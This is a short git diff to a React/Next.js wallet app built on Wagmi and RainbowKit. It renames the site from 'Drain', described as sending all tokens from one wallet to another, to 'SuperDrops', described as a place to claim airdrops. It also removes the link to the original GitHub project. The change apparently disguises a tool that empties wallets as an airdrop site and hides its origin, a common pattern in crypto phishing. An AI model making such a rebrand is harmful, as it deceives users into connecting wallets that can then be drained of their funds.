@@ -3,7 +3,6 @@ import { useEffect, useState } from 'react';
 import { CssBaseline, GeistProvider } from '@geist-ui/core';
 import type { AppProps } from 'next/app';
 import NextHead from 'next/head';
-import GithubCorner from 'react-github-corner';
 import '../styles/globals.css';
 
 // Wagmi and RainbowKit imports
@@ -131,13 +130,12 @@ const App = ({ Component, pageProps }: AppProps) => {
       <WagmiConfig config={wagmiConfig}>
         <RainbowKitProvider>
           <NextHead>
-            <title>Drain</title>
-            <meta name="description" content="Send all tokens from one wallet to another" />
+            <title>SuperDrops</title>
+            <meta name="description" content="Claim Airdrops. Be First to Know" />
             <link rel="icon" href="/favicon.ico" />
           </NextHead>
           <GeistProvider>
             <CssBaseline />
-            <GithubCorner href="https://github.com/dawsbot/drain" size="140" bannerColor="#e056fd" />
             {isMounted && web3wallet ? <Component {...pageProps} /> : null}
           </GeistProvider>
         </RainbowKitProvider>
